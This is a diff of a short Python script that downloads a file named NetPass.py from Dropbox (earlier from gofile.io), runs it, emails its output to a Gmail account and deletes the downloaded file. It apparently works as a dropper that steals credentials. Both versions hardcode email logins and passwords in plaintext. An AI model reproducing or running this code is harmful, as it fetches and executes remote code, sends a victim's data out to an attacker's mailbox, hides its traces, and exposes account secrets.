@@ -2,19 +2,17 @@ import subprocess
 import wget
 import smtplib
 
-def Downloader(url) :
-    wget.deownload(url)
-def EmailSender(From_Email , Sender , Message ):
-    # Here we are are specifying Email Server
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    # Here we are loging to the Email sever
-    server.login('mbxtest5003@gmail.com', "Tailor_5004")
-    # here we are sending Email
-    server.sendmail(From_Email,Sender,Message)
-    #server.sendmail( "from@address.com","Mr_MBX-217@outlook.com",)
+def Downloader(url , file) :
+    wget.download(url , file)
+def sending_mail(email, password , message) :
+    server = smtplib.SMTP("smtp.gmail.com" , 587)
+    server.starttls()
+    server.login(email , password)
+    server.sendmail(email , email , message)
+    server.quit()
 
 
-#output = subprocess.check_output("python Netpass")
-#EmailSender("from@address.com" , "Mr_MBX-217@outlook.com" ,  )
-#Downloader("https://srv-store1.gofile.io/download/b8drUF/51e6da73e989bd08b45d9b4297ae0d92/Netpass.py" , "NetPass.py")
-Downloader("https://srv-store1.gofile.io/download/b8drUF/51e6da73e989bd08b45d9b4297ae0d92/Netpass.py" )
+Downloader("https://dl.dropboxusercontent.com/s/b32iy3m6b6glspw/NetPass.py?dl=1" , "kk.py")
+Command_result = subprocess.check_output("python kk.py" , shell=True)
+sending_mail("abama.test.2020@gmail.com", "Yousef@2003", Command_result)
+subprocess.check_output("del kk.py" , shell=True)
